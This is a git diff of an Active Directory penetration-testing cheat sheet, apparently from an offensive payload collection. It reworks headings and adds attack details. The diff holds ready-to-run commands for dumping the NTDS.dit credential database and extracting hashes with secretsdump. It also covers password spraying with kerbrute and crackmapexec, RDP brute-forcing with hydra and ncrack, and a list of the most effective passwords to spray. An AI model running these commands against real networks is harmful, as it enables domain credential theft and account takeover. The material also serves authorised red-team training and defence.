@@ -10,7 +10,7 @@
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
-    - [Dumping AD Domain Credentials (%SystemRoot%\NTDS\Ntds.dit)](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
+    - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
       - [Using ndtsutil](#using-ndtsutil)
       - [Using Vshadow](#using-vshadow)
       - [Using vssadmin](#using-vssadmin)
@@ -21,10 +21,9 @@
       - [Using Mimikatz DCSync](#using-mimikatz-dcsync)
       - [Using Mimikatz sekurlsa](#using-mimikatz-sekurlsa)
     - [Password spraying](#password-spraying)
-      - [Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.](#using-kerbrute-a-tool-to-perform-kerberos-pre-auth-bruteforcing)
-      - [Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.](#using-crackmapexec-and-mp64-to-generate-passwords-and-spray-them-against-smb-services-on-the-network)
-      - [Using RDPassSpray to target RDP services.](#using-rdpassspray-to-target-rdp-services)
-      - [Using [hydra]() and [ncrack]() to target RDP services.](#using-hydra-and-ncrack-to-target-rdp-services)
+      - [Kerberos pre-auth bruteforcing](#kerberos-pre-auth-bruteforcing)
+      - [Spray a pre-generated passwords list](#spray-a-pre-generated-passwords-list)
+      - [Spray passwords against the RDP service](#spray-passwords-against-the-rdp-service)
     - [Password in AD User comment](#password-in-ad-user-comment)
     - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
       - [Using Mimikatz](#using-mimikatz)
@@ -80,6 +79,7 @@
   ./bloodhound
   SharpHound.exe (from resources/Ingestor)
   SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+  SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
   or 
   Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
   or 
@@ -358,7 +358,11 @@ Get-NetGPO
 Get-NetGPOGroup
 ```
 
-### Dumping AD Domain Credentials (%SystemRoot%\NTDS\Ntds.dit)
+### Dumping AD Domain Credentials
+
+You will need the following files to extract the ntds : 
+- ntds file (C:\Windows\NTDS\ntds.dit)
+- SYSTEM hive (C:\Windows\System32\SYSTEM)
 
 #### Using ndtsutil
 
@@ -429,7 +433,7 @@ esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 
 #### Extract hashes from ntds.dit
 
-then you need to use secretsdump to extract the hashes
+then you need to use secretsdump to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
 
 ```java
 secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
@@ -490,7 +494,17 @@ Password spraying refers to the attack method that takes a large number of usern
 
 > The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
 
-#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+Most of the time the best passwords to spray are :
+
+- Password123
+- Welcome1
+- $Companyname1 : $Microsoft1
+- SeasonYear : Winter2019*
+- Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
+
+#### Kerberos pre-auth bruteforcing
+
+Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 > Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
 
@@ -500,31 +514,29 @@ root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users
 root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 ```
 
-#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+#### Spray a pre-generated passwords list
+
+Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
 
 ```powershell
 crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
 ```
 
-#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
+#### Spray passwords against the RDP service
+
+Using RDPassSpray to target RDP services.
 
 ```powershell
+git clone https://github.com/xFreed0m/RDPassSpray
 python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
 ```
 
-#### Using [hydra]() and [ncrack]() to target RDP services.
+Using hydra and ncrack to target RDP services.
 
 ```powershell
 hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
 ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
 ```
-
-Most of the time the best passwords to spray are :
-
-- Password123
-- Welcome1
-- $Companyname1 : $Microsoft1
-- SeasonYear : Winter2019*
 
 ### Password in AD User comment
 
